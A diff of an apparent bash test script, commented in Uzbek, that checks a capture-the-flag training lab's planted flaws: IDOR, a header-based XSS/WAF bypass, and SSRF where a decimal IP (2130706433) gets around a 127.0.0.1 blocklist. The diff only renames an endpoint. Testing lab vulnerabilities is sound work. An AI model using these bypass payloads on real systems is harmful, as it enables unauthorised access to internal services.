@@ -10,8 +10,8 @@ pass=0; fail=0
 chk(){ if echo "$2" | grep -q "$1"; then echo "  [PASS] $3"; pass=$((pass+1)); else echo "  [FAIL] $3 -- got: $(echo "$2"|tr '\n' ' '|cut -c1-100)"; fail=$((fail+1)); fi; }
 
 echo "### 0) discovery — endpointlar javob beradi (gobuster -x php,txt topadi)"
-OUT=$($A "for p in download.php search.php fetch.php admin-metrics.php flag.php storage-backup/ ; do curl -s -o /dev/null -w '%{http_code} ' $T/\$p ; done")
-echo "    codes (download/search/fetch/admin-metrics/flag/storage-backup): $OUT"
+OUT=$($A "for p in download.php search.php fetch.php internal.php flag.php storage-backup/ ; do curl -s -o /dev/null -w '%{http_code} ' $T/\$p ; done")
+echo "    codes (download/search/fetch/internal/flag/storage-backup): $OUT"
 chk "200" "$OUT" "asosiy endpointlar tirik"
 
 echo "### 1) IDOR — download.php (report_id=0 via Burp)"
@@ -36,10 +36,10 @@ FG=$($A "curl -s -H 'Sec-Fetch-Site: same-origin' $T/flag.php")
 chk "EJPT{w4f_byp4ss" "$FG" "flag.php same-origin -> XSS flag"
 
 echo "### 4) SSRF + decimal-IP bypass — fetch.php"
-BL=$($A "curl -s '$T/fetch.php?url=http://127.0.0.1/admin-metrics.php'")
+BL=$($A "curl -s '$T/fetch.php?url=http://127.0.0.1/internal.php'")
 chk "reach that link" "$BL" "127.0.0.1 -> generic error (blocklist, banner yo'q)"
-SS=$($A "curl -s '$T/fetch.php?url=http://2130706433/admin-metrics.php'")
-chk "EJPT{ssrf_d3c1m4l" "$SS" "decimal 2130706433 -> admin-metrics flag"
+SS=$($A "curl -s '$T/fetch.php?url=http://2130706433/internal.php'")
+chk "EJPT{ssrf_d3c1m4l" "$SS" "decimal 2130706433 -> internal flag"
 
 echo ""
 echo "### NATIJA: PASS=$pass  FAIL=$fail"
